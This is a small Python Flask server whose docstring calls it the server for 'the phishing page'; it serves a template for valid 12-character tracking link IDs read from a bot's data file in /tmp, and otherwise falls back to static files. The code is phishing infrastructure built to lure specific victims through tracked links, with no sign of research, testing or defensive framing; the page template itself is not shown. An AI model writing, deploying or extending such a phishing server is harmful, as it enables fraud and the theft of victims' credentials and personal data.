import os
from flask import Flask, send_from_directory, abort
import json

app = Flask(__name__)

TEMPLATES_DIR = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'templates')

def is_valid_link_id(link_id):
    """Check if link ID exists in our data"""
    data_dir = '/tmp/bot_data'
    links_file = os.path.join(data_dir, 'links.json')
    if os.path.exists(links_file):
        with open(links_file, 'r') as f:
            links = json.load(f)
        return link_id in links
    return False

@app.route('/', defaults={'path': ''}, methods=['GET'])
@app.route('/<path:path>', methods=['GET'])
def serve_page(path):
    """Serve the phishing page"""
    # If path is a valid link ID, serve the template
    if path and is_valid_link_id(path):
        return send_from_directory(TEMPLATES_DIR, 'index.html')
    
    # Check if it's a static file
    static_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'static')
    file_path = os.path.join(static_dir, path)
    if os.path.exists(file_path) and os.path.isfile(file_path):
        return send_from_directory(static_dir, path)
    
    # Default: serve the page with link ID extraction
    if path and len(path) == 12:  # Link IDs are 12 chars
        return send_from_directory(TEMPLATES_DIR, 'index.html')
    
    abort(404)

if __name__ == '__main__':
    app.run(debug=True, port=5000)
